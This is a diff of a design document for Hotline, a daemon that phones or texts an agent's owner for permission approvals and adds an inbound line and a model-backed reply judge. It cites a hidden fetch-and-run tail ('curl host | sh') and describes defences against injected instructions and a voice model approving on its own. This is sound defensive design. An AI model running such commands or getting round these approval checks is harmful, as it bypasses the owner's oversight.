@@ -45,12 +45,14 @@ adapters in [hooks.md](hooks.md) are the clients):
 | Route | Does |
 | --- | --- |
 | `GET /v1/health` | `{"ok": true, "version": "..."}` |
-| `POST /v1/sessions` | Registers `{agent, cwd, agentSessionId?}` and returns `{session}` (201). A live session with the same agent and `agentSessionId` is reused (200) |
+| `POST /v1/sessions` | Registers `{agent, cwd, agentSessionId?}` and returns `{session}` (201). A live session with the same agent and `agentSessionId` is reused (200). A new one first ends stale sessions ([session lifetime](#session-lifetime)); at 20 live sessions it ends one idle for 15 minutes with nothing open, or gets `429` (audited as `session.refused`) |
 | `POST /v1/sessions/:sessionId/asks` | Queues `{kind, text, options?, toolName?, risk?, urgent?}` and returns `{ask}` (201). `kind` is `question`, `notify`, `permission` or `stop`. Only questions carry `options`; `permission` requires `toolName` (identifier characters, up to 100) and `risk` (`low` or `high`), and no other kind may send them. Text, options and the tool name are redacted before they are stored. The ask expires after `policy.askTimeoutMinutes`. Open-ask caps per session / across all sessions: questions 3 / 10, notifications 10 / 30, permission requests 3 / 10, stops 1 / 10; past them `429` (audited as `ask.refused`). A new `stop` cancels the session's older open `stop` first. `urgent` is the agent's request only; call policy decides |
 | `GET /v1/asks/:askId/outcome?waitSeconds=0..30` | `{state: "waiting", ask}` or `{state: "final", ask, outcome}`, waiting up to `waitSeconds` for a change |
 | `POST /v1/asks/:askId/cancel` | Cancels an ask that is still open: `{cancelled}` |
-| `POST /v1/sessions/:sessionId/end` | Marks the session `ended` and cancels its open asks: `{ended}`. An ended session takes no new asks (`404`) |
-| `GET /v1/sessions/:sessionId/inbox` | `{session, instructions, asks}`: owner instructions (always empty until HL-10 adds the queue) and the 20 newest asks with their outcomes |
+| `POST /v1/sessions/:sessionId/end` | Marks the session `ended`, cancels its open asks and drops its queued instructions: `{ended}`. An ended session takes no new asks, and its inbox and instruction routes answer `404` too, so its client registers again |
+| `GET /v1/sessions/:sessionId/inbox` | `{session, instructions, asks}`: the owner's queued instructions for this session ([inbound line](#inbound-line)) with their ids, listed but not handed over (the reader acknowledges them), and the 20 newest asks with their outcomes |
+| `GET /v1/sessions/:sessionId/instructions` | Lists the session's queued instructions, oldest first, without handing them over: `{instructions: [{id, text, receivedAt}]}` |
+| `POST /v1/sessions/:sessionId/instructions/ack` | `{via: "ask" \| "stop", ids}` marks those of `ids` still queued (and within their 6 hours) delivered and returns them: `{instructions: [{text, receivedAt}]}`. A reader acknowledges only what it is about to pass on: the MCP server just before it returns `ask_human`, the Stop hook once away mode and its count are settled |
 
 Bodies are strict: an unknown field, a relative `cwd`, more than 9 options,
 options on anything but a question, or a `toolName` or `risk` that is missing
@@ -203,10 +205,10 @@ Otherwise it logs `voice webhooks off` with the reason and the paths stay a
 
 | Tool | What the route does |
 | --- | --- |
-| `verify_pin` | Checks the PIN with the `PinGate`: 2 wrong PINs per call, then `end_call: true` and no further checks on that call; 6 wrong PINs across all calls of one direction in a rolling hour, or 10 in a rolling day, lock every check on that direction, the right PIN included, until enough time has passed. A caller spoofing the owner's number therefore gets at most 10 guesses a day (0.1% of a 4-digit PIN space). Each lockout calls the PinGate's `onLockout` so the owner can be told (HL-10 texts them). Inbound and outbound calls have separate budgets, so someone guessing on inbound calls (caller ID can be spoofed) cannot block PIN approvals on calls Hotline placed to the owner. The trade-off: such guessing still locks the owner's own inbound line for up to an hour, which fails closed. Answers `{verified, attempts_left, end_call}`. A verified PIN is registered with the redactor (`addShortSecret`). The PIN is checked against `owner.pinHash` with scrypt and never logged or stored |
+| `verify_pin` | Checks the PIN with the `PinGate`: 2 wrong PINs per call, then `end_call: true` and no further checks on that call; 6 wrong PINs across all calls of one direction in a rolling hour, or 10 in a rolling day, lock every check on that direction, the right PIN included, until enough time has passed. A caller spoofing the owner's number therefore gets at most 10 guesses a day (0.1% of a 4-digit PIN space). Each lockout calls the PinGate's `onLockout`, and the inbound line texts the owner (at most once an hour per direction). Inbound and outbound calls have separate budgets, so someone guessing on inbound calls (caller ID can be spoofed) cannot block PIN approvals on calls Hotline placed to the owner. The trade-off: such guessing still locks the owner's own inbound line for up to an hour, which fails closed. Answers `{verified, attempts_left, end_call}`. A verified PIN is registered with the redactor (`addShortSecret`). The PIN is checked against `owner.pinHash` with scrypt and never logged or stored |
 | `submit_answer` | On an inbound call, `pin-required` until this call passed `verify_pin`, because caller ID can be spoofed. A call is outbound only when the injected `placedCall(conversationId)` says Hotline placed it (call orchestration knows) and it went to the owner's number from another number; everything else counts as inbound. `runDaemon` passes call orchestration's `placedCall`, true from the moment a call is placed until its post-call event, its failure or the stuck-call limit. Otherwise passes the ask number, decision (`option`, `allow`, `deny`, `text`, `done` or `unclear`), the owner's words, the direction and the call ids to the `submitAnswer` handler. `confirmation` is `pin` only when this call passed `verify_pin`; nothing in the request can set it |
-| `get_status` | `{"result": "pin-required"}` until this call passed `verify_pin`. Then the `getStatus` handler's text, redacted and cut to 1500 characters |
-| `send_instruction` | `pin-required` until this call passed `verify_pin`. Then the `sendInstruction` handler gets the session number, instruction and the owner's words |
+| `get_status` | `{"result": "pin-required"}` until this call passed `verify_pin`. Then the `getStatus` handler's text (the [inbound line](#inbound-line)'s numbered status), redacted and cut to 1500 characters |
+| `send_instruction` | `pin-required` until this call passed `verify_pin`. Then the `sendInstruction` handler gets the session number, instruction and the owner's words, and answers `queued` (held until the post-call transcript confirms it), `unknown-session` (not a number this call's status read out, or that session ended), `too-many` or `invalid` |
 
 **Post-call webhook** (`POST /hooks/el/post-call`):
 
@@ -252,10 +254,10 @@ Otherwise it logs `voice webhooks off` with the reason and the paths stay a
 - **Logs:** tool name and result, event kind. Never bodies, words, transcripts,
   PINs or numbers.
 
-`submit_answer` and the post-call webhook go to call orchestration (below).
-Until the inbound line (HL-10) provides its handlers, `runDaemon` records
-`voice.instruction` in the audit log, answers `unknown-session`, and reads out
-no status.
+`submit_answer` goes to call orchestration (below), `get_status` and
+`send_instruction` to the [inbound line](#inbound-line), and the post-call
+webhook to both. `PinGate.onLockout` goes to the inbound line, which audits it
+(`voice.pin-lockout`) and texts the owner.
 
 ## Call orchestration
 
@@ -385,7 +387,7 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
     There must be a read-back of this ask: an agent turn recognised as reading
     it, after an earlier turn that read it (the first reading is never its own
     read-back), that asks for a yes (a `?`, "yes" or "confirm"), such as
-    "Allow pnpm test in demo-app? Yes?" or "Sorry, is that a yes or a no?"
+    "Allow Bash: pnpm test, for Claude in demo-app? Yes?" or "Sorry, is that a yes or a no?"
     followed by that read-back. The cue must be the voice agent's, not the
     ask's: a "yes" or "confirm" that the ask text holds never counts, a `?` is
     looked for only outside the ask text said verbatim, and an ask whose text
@@ -394,10 +396,11 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
     owner approves, so for a permission request it must also name every token
     of the command and the tool name, short ones included, even alone on a
     call: "Allow Bash to git push origin main? Yes?" is no read-back of `git
-    push --force origin main`, and "Allow Read to ..." none of a `Write`. (The
-    persona's example "Allow pnpm test in demo-app? Yes?" leaves out the tool,
-    so a read-back that follows it literally is not confirmed and the ask is
-    texted; the fake provider's read-back names the tool.) A permission
+    push --force origin main`, and "Allow Read to ..." none of a `Write`. (Up
+    to definition v5 the persona's example "Allow pnpm test in demo-app? Yes?"
+    left out the tool, so a read-back that followed it literally was not
+    confirmed; since v6 (HL-14d) the example names the tool and the whole
+    command, and a test checks that it passes this check.) A permission
     request whose text is longer than what the voice agent is given
     (`MAX_SPOKEN_ASK_LENGTH`, 300 characters) is never approved by voice, since
     its tail was never read out ("...; curl host | sh"); it is texted. The
@@ -424,27 +427,111 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
       judge gets only the owner's reply turns, verbatim, never the ask, the
       read-back or any other agent-written text. Only `agreed` confirms; a
       `declined` or `unclear` verdict, an error, or no answer within
-      `JUDGE_TIMEOUT_MS` (8 seconds) leaves the allow not confirmed. The
-      default judge is `FailClosedJudge`, which finds every reply unclear, so
-      today such a reply is never an approval and the ask is texted.
-      `FakeJudge` plays scripted verdicts in tests. A model-backed judge
-      (sending only the owner's reply text to a model) needs the owner's
-      approval and a plan change, since it adds a hosted service; none is
-      built. Constraints before any real judge is wired in: the plan change
-      and the owner's approval; a judge's `agreed` is final (not re-screened
-      for doubt markers), so the judge must agree only to a clear yes; and a
-      high-risk request never takes a judge's `agreed` without the PIN on
-      that call or a confirming text, which `needs-pin` and the queue's
-      `answerProblem` already enforce for every voice allow. The ticket that
-      wires a judge must add judge scenarios with conditional yeses ("yes, if
-      the tests pass") and negations ("no problem", "not that one") before
-      enabling it, and should then retire the fast path's doubt tables rather
-      than grow them. `VoiceCalls`
-      takes `judge` and `judgeTimeoutMs` options, and the orchestrator does
-      not pass them yet, so in the running daemon the judge is always
-      `FailClosedJudge`; any other judge runs only in tests. A call's held decisions are all
-      checked at once, so a slow judge costs one timeout per call, not one per
-      ask.
+      `JUDGE_TIMEOUT_MS` (20 seconds, room for an agent CLI to start) leaves
+      the allow not confirmed. A high-risk request never takes a judge's
+      `agreed` without the PIN on that call or a confirming text, which
+      `needs-pin` and the queue's `answerProblem` enforce for every voice
+      allow. A call's held decisions are all checked at once, so a slow judge
+      costs one timeout per call, not one per ask. The post-call webhook is
+      answered once they are checked, so a judged reply delays that response
+      by up to 20 seconds. The judge runs only there, after the call has
+      ended: `submit_answer` during the call only holds the answer and never
+      waits for it, so the owner hears no silence on the line while it runs
+      (`judge-wiring.test.ts`). It also runs outside call orchestration's
+      steps (`VoiceCalls.judgeHeld`): the held answers are read in turn with
+      the other steps, judged, and the checks applied in turn again, so a slow
+      judge never holds a `submit_answer` on another call (such as a PIN-verified
+      inbound call), an owner's text or a tick. A held answer that changed
+      while the judge ran is checked again by the fast path alone.
+
+    **The model-backed judge (HL-09d, `reply-judge.ts`).** A plan change at
+    the owner's direction: the reply goes to the owner's own agent provider,
+    on the plan the owner already pays for. `runDaemon` picks the judge once
+    at start (`selectReplyJudge`), logs it (`reply judge`, with the backend
+    and why) and records the backend in the `daemon.started` audit entry.
+    Until the owner has chosen (`judge.backend` unset; `hotline init` asks
+    once or takes `--judge`) it is `FailClosedJudge`: nothing is looked up,
+    run or sent. With `judge.backend: "auto"` it takes the first available
+    of:
+    1. **Claude Code CLI** (`claude` on the PATH), on the owner's login:
+       `claude -p --output-format json --model haiku --no-session-persistence
+       --settings '{"disableAllHooks":true}' --strict-mcp-config --mcp-config
+       '{"mcpServers":{}}' --tools "" --system-prompt <one line>`. `--bare`
+       cannot be used: it never reads the OAuth login.
+    2. **Codex CLI** (`codex` on the PATH), on the owner's login: `codex exec
+       --ephemeral --ignore-user-config --ignore-rules --sandbox read-only
+       --skip-git-repo-check --output-schema <file> --output-last-message
+       <file> --color never -c model_reasoning_effort="low" -`, with Codex's
+       default model.
+    3. **Anthropic API**, when the optional `anthropic.apiKey` secret is set
+       (`HOTLINE_ANTHROPIC_API_KEY` at `hotline init`): `POST /v1/messages`
+       with `claude-haiku-5-5`, low effort and a JSON-schema output format,
+       through the daemon's `fetch`. The key is added to the redactor.
+    4. **None**: `FailClosedJudge`; such a reply is texted.
+
+    `judge.backend` can also name one backend (`claude-code`, `codex`,
+    `anthropic-api`; none when it is not available) or be `off`, which sends
+    nothing anywhere. A CLI counts as available when it is an executable on
+    the PATH: nothing is run to find out, so neither the daemon nor `hotline
+    doctor` calls a model at start. Each CLI run happens in a fresh, empty
+    temporary directory (removed afterwards; Codex's schema and answer files
+    sit in a second one), with an allowlisted environment (`judgeChildEnv`:
+    `JUDGE_BASE_ENV`, that is `PATH`, `HOME`, user, locale, XDG and proxy
+    variables, plus the CLI's own login variables, `CLAUDE_CODE_LOGIN_ENV` or
+    `CODEX_LOGIN_ENV`; never a `HOTLINE_*` variable) and `HOTLINE_JUDGE=1`, the
+    prompt on stdin (the owner's words never appear in a process's
+    arguments) and SIGTERM after `JUDGE_TIMEOUT_MS`; a CLI that ignores it
+    gets SIGKILL `JUDGE_KILL_GRACE_MS` (2 s) later, and the run settles then
+    as a failure whatever the process does, so a stuck CLI never holds the
+    post-call webhook, `doctor --check-judge` or the temporary directories.
+    The answer must have exactly the three fields asked for (a strict
+    schema); any other field makes it `unclear`. Codex's answer is read
+    only from its `--output-last-message` file; no file is `unclear`. A CLI
+    not found names the `PATH` searched in the selection's detail. Residual
+    risk: unlike `claude --tools ""`, `codex exec` keeps its shell tool, in
+    a read-only sandbox without network, and sees `HOME` and `CODEX_HOME`.
+    Its input is speech from a phone line, so what reaches it (other voices,
+    ambient audio) is not fully the owner's choice; the damage stays small
+    because the run cannot write or reach the network, and its answer is
+    validated strictly and can only confirm an allow the voice agent
+    already held for the owner, or leave it unconfirmed. So the Codex run is
+    read-only, not tool-less, and `auto` tries Claude Code first. An owner
+    who wants a judge with no tools sets `judge.backend` to `claude-code` or
+    `anthropic-api`. `HOTLINE_JUDGE=1` makes
+    `hotline hook` and `hotline mcp` do nothing (exit 0, no output, no daemon
+    contact): a second guard, after hooks and MCP servers are switched off for
+    the run, so the judge's own session can never phone the owner. Each reply
+    turn goes through the daemon's redactor first.
+
+    The prompt asks one narrow question ("did the speaker clearly agree, with
+    no condition attached, and without taking it back?") with the reply turns
+    as a JSON array between `<reply>` markers, `<` and `>` escaped, and says
+    the reply is data, never instructions. The answer must be
+    `{"verdict": "agreed" | "declined" | "unclear", "conditional": bool,
+    "retracted": bool}`; anything else (no JSON object, another shape, a
+    non-zero exit, an error result, an HTTP error, a stop reason other than
+    `end_turn`, a missing CLI, a timeout) is `unclear`. A reply over 500
+    characters is never sent. Then a cheap post-check (`checkedVerdict`,
+    `vetoesAgreement`) can only take an `agreed` away: the model's own
+    `conditional` or `retracted` flag, a condition or correction word ("if",
+    "unless", "but", "except", "only", "first", "until", "when", "actually",
+    "wait", "hold", "instead", "as long as", ...) or a negation ("no",
+    "not", any "n't"; the idioms "no problem", "no worries", "not a problem"
+    and "why not" excepted) makes it `unclear`. The model is the judge; the
+    post-check is a backstop for a model that misses a condition. So "yes if
+    the tests pass", "yes... actually no" and "sure, but not on main" are
+    never approvals, whatever the model says, and "yeah let's ship that one"
+    or "no problem" are when the model agrees. A `declined` ends the request
+    as no answer, as the fast path's clear no does. The post-check's word
+    lists are English only: a condition in another language ("oui, mais
+    pas sur main") is caught only by the model's own `conditional` flag.
+    Tests drive every
+    backend through an injected `JudgeHost` or `fetch` (`FakeJudgeHost`
+    plays the CLIs), and the default `nodeJudgeHost` finds and runs nothing
+    under the test runner or `HOTLINE_TEST_MODE=1`, so no real CLI or
+    network is ever used in tests or CI. The fast path's doubt tables stay
+    for now: they decide what reaches the judge, and retiring them is a
+    follow-up.
 
     The owner can also take an approval back after the agent acknowledged
     it ("Got it." then "wait, no, don't"): an owner turn after the reply,
@@ -503,11 +590,14 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
   word in a later turn about the ask also takes back a free-text answer. These
   rules are tested on scripted transcripts only; real ElevenLabs transcripts
   (turn splitting, interruptions, paraphrased readings) need the live check, and
-  some answers will be refused there until the persona is tuned. Until a
-  real judge is approved, any natural yes outside the fast path's table is
-  texted rather than approved. With a real judge, its verdict on the owner's
-  words is what stands between a voice model that submits an allow on its
-  own and an approval. High-risk requests still need the PIN.
+  some answers will be refused there until the persona is tuned. Without a
+  judge backend (or with `judge.backend: "off"`), any natural yes outside the
+  fast path's table is texted rather than approved. With one, its verdict on
+  the owner's words (and the post-check) is what stands between a voice model
+  that submits an allow on its own and an approval. The judge prompt and
+  post-check are tested against a scripted model only; how well a real model
+  judges real replies needs the live check. High-risk requests still need the
+  PIN.
 - **How a call ended.** `call_initiation_failure` `busy` or `no-answer` is
   `no-pickup`, anything else `failed`. A transcription in which the owner never
   spoke is `no-pickup` (voicemail, silence); one where every ask was settled is
@@ -549,8 +639,8 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
   but never finished) get one text on the next start saying a text may not
   have been recorded. `call me` becomes the queue's `call-me`
   event and gets "calling you now" or the queue's reason for not calling.
-  `status` waits for HL-10; `stop` and Twilio's keywords get no reply of
-  Hotline's own. Any other text answers only an ask Hotline texted that is
+  `status` gets the [inbound line](#inbound-line)'s status of every live
+  session; `stop` and Twilio's keywords get no reply of Hotline's own. Any other text answers only an ask Hotline texted that is
   still open, and only one: a `YES <code>` reply names the ask with that code;
   otherwise there must be exactly one such ask, texted at least 10 seconds
   before the message was first seen (the time its SID was claimed; an ask with
@@ -580,6 +670,159 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
   `outbound texts off` with the reason when one is missing. Then every call or
   text fails and the queue falls back or ends the ask as no answer.
 
+## Inbound line
+
+`InboundLine` (`inbound-line.ts`, HL-10, plan section 4D) serves the owner
+calling the Hotline number or texting `status`. The routes above have already
+checked the tool secret, that the owner's number is on the call, and that this
+call passed `verify_pin`; before that nothing is read out and nothing is taken
+(`pin-required`), so a caller spoofing the owner's number still needs the PIN.
+Anyone else's call gets `refused` with `end_call` on its first tool call, and
+anyone else's text the generic SMS reply.
+
+- **Status.** `get_status` numbers every live session, oldest registration
+  first, and remembers on this call which number is which session. Numbers
+  are stable for the whole call: on a later status a session keeps its
+  number, a new one gets the next unused number, and an ended one's number
+  is never reused. Per
+  session: its spoken name, state, open asks by kind, the latest ask's text
+  (already redacted when it was stored, redacted again and cut to 120
+  characters), queued instructions, and when it was last heard from. The name
+  and the ask text are agent-derived, so they are fenced in `<agent_text>` like
+  ask text on outbound calls. The whole status stays under 1400 characters;
+  sessions past that are counted ("3 more sessions are not read out") and
+  cannot be given instructions on that call, since only the numbers read out
+  are remembered. Open asks are counted from all of a session's open asks;
+  the latest text is its newest ask's. Stale
+  sessions are ended first ([session lifetime](#session-lifetime)). The `status`
+  text gets the same status with state and counts only: no agent-written ask
+  text goes to Twilio. It goes back only to the owner's
+  number (the webhook checked the sender, and Twilio replies to that number), so
+  a spoofed sender never sees it.
+- **Instructions are held, then confirmed.** `send_instruction` takes only a
+  session number that this call's status read out and a session still live;
+  then it holds the instruction (`queued`) until the post-call transcript. Caps:
+  5 per call, 3 waiting per session, 20 in all (`too-many`). At the post-call
+  event each held instruction must pass `confirmInstruction`
+  (`instruction-confirm.ts`):
+  - the owner's utterance (one stretch of owner turns between two agent turns;
+    on an inbound call only turns after the PIN are the owner's, and a stretch
+    with anyone else's turn never counts) is the instruction and nothing else:
+    the instruction's words in order, preceded at most by a session reference
+    ("session two", "tell Codex to", "the second one") and filler, followed at
+    most by filler ("thanks"). So "don't push to main" never confirms "push to
+    main", a qualifier after it is never dropped, and every word of the
+    instruction comes from the owner's own turns, never from the status or a
+    read-back. Session names come from agent folders, so a name word counts
+    as reference only when the owner named the session by name, never once
+    they gave a number ("session one, push to main" never confirms "to main"
+    for a session named "push"), and never a word of the instruction.
+    `owner_words` must be the owner's words in that utterance;
+  - exactly one session is identified in that reference (or, when it has none,
+    in an owner stretch just before that is only a session reference): by
+    "session N" or "number N", an ordinal, a bare digit, or a name matching it
+    better than any other listed session. Words inside the instruction never
+    name a session ("in session one, add test two" names session 1 only). Two
+    identifiers, or none with more than one session listed, mean not
+    confirmed;
+  - the agent's next turn is the read-back the prompt asks for ("For session
+    2, Codex in api: rebase on main. Send it?"): it names "session <n>" for
+    that session and repeats the instruction's words, and the owner's reply is
+    a clear yes (a yes word, nothing doubtful, no question, no retraction);
+  - for the rest of the call after that yes, no owner turn holds a retraction
+    ("never mind", "cancel that", "forget about it", "don't send", "hold
+    off"), a doubt marker or a bare negation ("no", "don't", "stop", "wait";
+    `soundsDoubtful` without counting questions). The one exception is a turn
+    that is itself the utterance of another instruction confirmed on its own
+    (`confirmInstructions` judges all of a call's instructions together,
+    repeating until nothing changes), and never a turn with a retraction. This
+    over-blocks on purpose: "no, that's all" drops it too, and the owner can
+    say it again or text it.
+  What is queued is never the model's `instruction` text: it is the owner's
+  own words for exactly the validated tokens, cut from the transcript (the
+  utterance minus its session reference and filler), with invisible
+  characters removed. After redaction it may hold only letters, digits, spaces
+  and plain punctuation (`plainInstruction`); one with any other symbol ("use
+  C++", "delete /tmp/x") is refused and the owner texted, never queued with
+  the symbol stripped. The read-back reply is judged by
+  a fixed yes lexicon and fails closed; HL-09c's reply judge can replace it
+  later.
+  Every comparison uses one tokeniser, `speechTokens` in `@hotline/providers`
+  (NFKC, lower case, apostrophe look-alikes, combining marks dropped), shared
+  with `ownerSaid` and `voice-confirm.ts`, so curly apostrophes, fullwidth
+  letters and stray marks compare the same in every check. Numbers on calls
+  and texts are compared with `sameE164`: both sides must be valid E.164 and
+  identical, with no digit stripping, so "15555550100" or "+1 555 555 0100" is
+  someone else. The PIN is only ever checked through `verify_pin`; nothing in a
+  transcript can stand for it.
+  A confirmed instruction is redacted, cut to 1000 characters and stored
+  (`instructions` table) with the owner's utterance as its excerpt and the
+  conversation id, under an id fixed when it was held, so a retried post-call
+  event stores it once. Anything else is dropped
+  (`voice.instruction-unconfirmed` with the reason). After the call the owner
+  gets one text either way, with counts only: that it was queued, or that it
+  was not passed on (and how many others were queued), since the voice agent
+  said `queued` before the transcript was checked. The held instructions and the call's
+  numbering live in memory for an hour. Past that without a post-call event
+  they are dropped, audited (`no post-call event`) and the owner gets the same
+  "not passed on" text. A restart before the post-call event drops them too
+  (fail closed; the PinGate's verification is in memory, so nothing would
+  count as the owner's anyway), but how many each call held is saved in
+  `daemon_state` (`inbound.held`, counts only), so the next start audits them
+  (`restarted`) and texts the owner once. The Stop hook looks for
+  instructions only with the agent's own session id, so it never registers a
+  throwaway session to look.
+- **Delivery.** Each instruction is handed over once, oldest first, to the
+  session's next reader: the MCP server after `ask_human` returns (it adds
+  them to the result), `check_inbox` (which reads the inbox, then acknowledges
+  what it lists just before it returns), or the Stop hook, which
+  takes them before it asks the owner anything and continues the agent with
+  them (`decision: block`, one instruction per line) within the usual loop
+  guards. A stop already waiting on the owner is cancelled when an instruction
+  for its session is queued (`ask.cancelled` by `instruction`), and the hook
+  then picks the instruction up. A permission request never carries one.
+  An ended session's inbox and instruction routes answer `404`, so its client
+  registers again (`check_inbox` retries once at once).
+  Instructions are dropped when their session ends and after 6 hours unread,
+  checked again at every hand-over
+  (`instruction.expired`).
+- **No answers on inbound calls.** Call orchestration accepts `submit_answer`
+  only on a call Hotline placed, so an inbound call answers no ask, PIN or not.
+  The plan's inbound line reads status and takes instructions only.
+- **Lockouts.** `PinGate.onLockout` is audited (`voice.pin-lockout`) and texted
+  to the owner, at most once an hour per direction, quiet hours or not.
+- **Inbound call records.** Each inbound call's post-call event stores a
+  `CallRecord` (direction `inbound`, no asks, `answered` when anything the
+  person said counted as the owner's, else `rejected`) with its duration and
+  cost estimate, for `hotline doctor`. No numbers are stored.
+- Known limits: Codex's MCP server has no session id of its own, so its MCP
+  session and its hooks' session are two sessions in the status; an
+  instruction reaches whichever one the owner named. Name the hooks' session
+  (it registered from a Stop or permission hook) to have the instruction
+  picked up at the agent's next stop in away mode, or the MCP one to have it
+  come back with its next `ask_human` or `check_inbox`. Not verified against
+  real Claude Code or Codex. The read-back reply
+  still uses the fixed yes lexicon; moving it to HL-09c's reply judge is a
+  follow-up. Real transcripts may
+  split or merge turns differently from the fake's; tune on the live check.
+
+## Session lifetime
+
+`sessions.ts`. The MCP server ends its session when it exits, but a killed
+server never does, and hook sessions never end at all. Before a new session
+registers and before each status is read, the daemon drops queued instructions
+older than 6 hours, then ends every live session nobody has heard from
+(`lastSeenAt`: registration, asks, inbox reads, instruction pickups) for 6
+hours that has no open ask and no queued instruction (`session.expired`). Ending
+a session cancels its open asks and drops its queued instructions, whoever ends
+it. At most 20 sessions are live at once. At the cap, a new registration ends
+the longest-idle live session that has no open ask and no queued instruction
+and has been idle for 15 minutes (`session.evicted`), so killed agents cannot
+lock registrations out for hours; when there is none it gets `429`
+(`session.refused`), so a looping agent cannot flood the status or evict
+sessions in use. An existing session can always refresh. A client whose
+session was ended registers again on its next call.
+
 ## Store
 
 SQLite through Node's built-in `node:sqlite`, at `hotline.db` in the hotline home,
@@ -593,7 +836,13 @@ on write and on read, next to the columns the daemon queries by. Migration 3
 `inbound_messages` (the owner's texts claimed, by message SID, and whether each
 was finished). Twilio signatures carry no timestamp, so a captured reply can be
 replayed at any time: finished SIDs are kept for 400 days and unfinished ones
-until they finish. Rows are tiny.
+until they finish. Rows are tiny. Migration 4 (HL-10) adds `instructions`:
+the owner's confirmed instructions with their session, status (`queued`,
+`delivered`, `dropped`), how they were delivered or why they were dropped, and
+the record (text, excerpt, conversation id) as JSON. `peekInstructions` lists a
+session's queued ones (dropping expired ones in the same transaction), and
+`ackInstructions` marks the given ids delivered in one transaction.
+`addInstruction` is idempotent by id.
 `onAskAdded` tells listeners about each new ask, as `onAskChange` does about
 status changes.
 
@@ -666,9 +915,9 @@ message, request fields, error stacks and bindings are all covered:
 - The owner's PIN, which is shorter than that minimum, can be registered with
   `addShortSecret` (4 to 8 digits). Any digit run or formatted number that
   contains it anywhere is removed whole, before phone masking, so a masked number
-  can never print the PIN as its last four digits. Until the inbound line (HL-10)
-  handles a spoken or keyed PIN, the key-based redaction above is what protects
-  it.
+  can never print the PIN as its last four digits. `verify_pin` registers the
+  PIN this way once it verified; before that, the key-based redaction above is
+  what protects it.
 - Numbers are redacted like their decimal text: phone-shaped, equal to a known
   secret, or containing the PIN.
 - Strings longer than 16 KiB are cut, along with the word at the cut, and
